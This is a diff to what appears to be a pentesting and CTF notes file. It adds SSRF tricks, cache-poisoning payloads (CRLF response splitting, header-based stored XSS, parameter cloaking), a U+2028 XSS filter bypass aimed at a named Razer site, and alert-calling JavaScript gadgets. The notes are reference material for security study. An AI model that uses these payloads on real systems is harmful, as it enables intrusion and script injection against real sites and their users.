@@ -371,6 +371,8 @@ Clone:
     - https://blog.dave.tf/post/ip-addr-parsing/
     - [AppSec EU15 \- Nicolas Gregoire \- Server\-Side Browsing Considered Harmful \- YouTube](https://www.youtube.com/watch?v=8t5-A4ASTIU)
     - Mitigation: netmask
+- domain resolving to 127.0.0.1
+    - `vcap.me.        86400   IN  A   127.0.0.1`
 - ip overflow
     ```
     127.0.513 == 127.0.2.1
@@ -379,6 +381,7 @@ Clone:
 - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 - [PHP :: Sec Bug \#79329 :: get\_headers\(\) silently truncates after a null byte](https://bugs.php.net/bug.php?id=79329)
 - https://github.com/jmdx/TLS-poison/
+- https://github.com/swisskyrepo/SSRFmap
 
 ```bash
 curl -v 'https://let-me-see.pwn.institute/' -G --data-urlencode 'url=http://127.0.0.1/?url=http://daffy-malleable-tote.glitch.me/go'
@@ -1083,9 +1086,19 @@ nginx:
     ```
 - cache poisoning
     - https://owasp.org/www-community/attacks/Cache_Poisoning
-    ```
-    language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20304%20Not%20Modified%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
-    ```
+        ```
+        language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20304%20Not%20Modified%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
+        ```
+    - https://youst.in/posts/cache-poisoning-at-scale/
+        - url fragment ignored when generating cache key
+            ```
+            /#/../?r=javascript:alert(1)
+            ```
+        - `x-http-method-override: HEAD` returning an empty response body
+        - `x-forwarded-scheme: http` triggering redirect loop
+        - `GET /foo.js` + `x-forwarded-host: foo` leading to stored xss
+        - `GET /foo?size=32x32&siz%65=0` where cache key uses first parameter but backend uses second parameter
+        - [headers\.txt · GitHub](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)
 - https://haboob.sa/ctf/nullcon-2019/babyJs.html
     - [Breakout in v3\.6\.9 · Issue \#186 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/186)
     - [Escaping the vm sandbox · Issue \#32 · patriksimek/vm2 · GitHub](https://github.com/patriksimek/vm2/issues/32)
@@ -1099,10 +1112,22 @@ nginx:
     - [How to bypass the Cloudflare WAF using a padding technique \- Swascan](https://www.swascan.com/cloudflare/)
     - https://support.cloudflare.com/hc/en-us/articles/200172016-Understanding-the-Cloudflare-Web-Application-Firewall-WAF-
         > The Cloudflare WAF parses JSON responses to identify vulnerabilities targeted at APIs. The WAF limits JSON payload parsing to 128 KB
+- JavaScript treats the U+2028 Line Separator character as a line terminator which results in a newline
+    - https://edoverflow.com/2022/bypassing-razers-dom-based-xss-filter/
+    - https://github.com/v8/v8/blob/78bc785227e95efe05f045756463696e06095506/src/parsing/scanner.cc#L208-L217
+    - https://tc39.es/ecma262/#sec-line-terminators
+    ```
+    javascript://deals.razerzone.com/%E2%80%A8alert(document.domain)
+    ```
 
 ```javascript
 // == "Hello World!"
 /Hello W/.source+/ordl!/.source
+
+// == alert('1337')
+// https://twitter.com/garethheyes/status/1493987593511387137
+'1337'.split(window,window[Symbol['split']]=alert)
+'1337'.replace(window,window[Symbol['replace']]=alert)
 ```
 
 ```bash
